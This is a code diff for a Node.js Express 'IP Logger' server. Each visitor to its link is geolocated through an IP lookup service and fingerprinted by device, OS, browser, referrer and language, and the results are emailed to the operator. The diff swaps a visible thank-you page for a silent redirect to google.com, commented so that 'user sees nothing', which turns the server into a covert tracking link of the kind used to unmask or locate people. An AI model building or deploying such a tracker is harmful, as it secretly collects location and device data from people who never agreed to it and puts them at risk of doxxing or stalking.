@@ -2,11 +2,11 @@ import dotenv from "dotenv";
 import express from "express";
 import fetch from "node-fetch";
 import nodemailer from "nodemailer";
+import { UAParser } from "ua-parser-js";
 
 dotenv.config();
-
 const app = express();
-const PORT = process.env.PORT || 8080;
+const PORT = process.env.PORT || 3000;
 
 app.set("trust proxy", true);
 
@@ -21,23 +21,33 @@ const transporter = nodemailer.createTransport({
 app.get("/", async (req, res) => {
 	const userIP =
 		req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
+	const parser = new UAParser();
+	const ua = parser.setUA(req.headers["user-agent"]).getResult();
+	const referer = req.headers["referer"] || "Direct";
+	const language = req.headers["accept-language"] || "Unknown";
 
 	try {
-		const geo = await fetch(`http://ip-api.com/json/${userIP}`);
-		const data = await geo.json();
+		const geoRes = await fetch(`http://ip-api.com/json/${userIP}`);
+		const geo = await geoRes.json();
 		const now = new Date().toLocaleString();
 
 		const message = `
-			✅ New visitor logged:
+✅ New visitor logged:
 
-		📍 IP: ${userIP}
-		🌎 Country: ${data.country}
-		🏙️ City: ${data.city}
-		🏢 ISP: ${data.isp}
-		🕒 Time: ${now}
-    	`.trim();
+📍 IP: ${userIP}
+🌎 Country: ${geo.country}
+🏙️ City: ${geo.city}
+🏢 ISP: ${geo.isp}
+🕒 Time: ${now}
 
-		// Send email
+🧠 Device: ${ua.device.type || "Desktop"}
+🛠️ OS: ${ua.os.name} ${ua.os.version}
+🌐 Browser: ${ua.browser.name} ${ua.browser.version}
+
+🔗 Referrer: ${referer}
+🗣️ Language: ${language}
+    `.trim();
+
 		await transporter.sendMail({
 			from: `"IP Logger" <${process.env.GMAIL_USER}>`,
 			to: process.env.GMAIL_TO,
@@ -45,14 +55,10 @@ app.get("/", async (req, res) => {
 			text: message,
 		});
 
-		console.log(`[GMAIL SENT] ${message}`);
-
-		// Send simple HTML response to visitor
-		res.send(
-			`<div style="margin: -8px;height: 100vh;display: flex;align-items: center;justify-content: center;"><span>Thank you!</span></div>`
-		);
-	} catch (e) {
-		console.error("❌ Error during IP logging or email:", e);
+		// ✅ SILENT RESPONSE (user sees nothing)
+		res.redirect("https://google.com");
+	} catch (err) {
+		console.error("❌ Error during logging/email:", err);
 		res.status(500).send("Error logging IP.");
 	}
 });
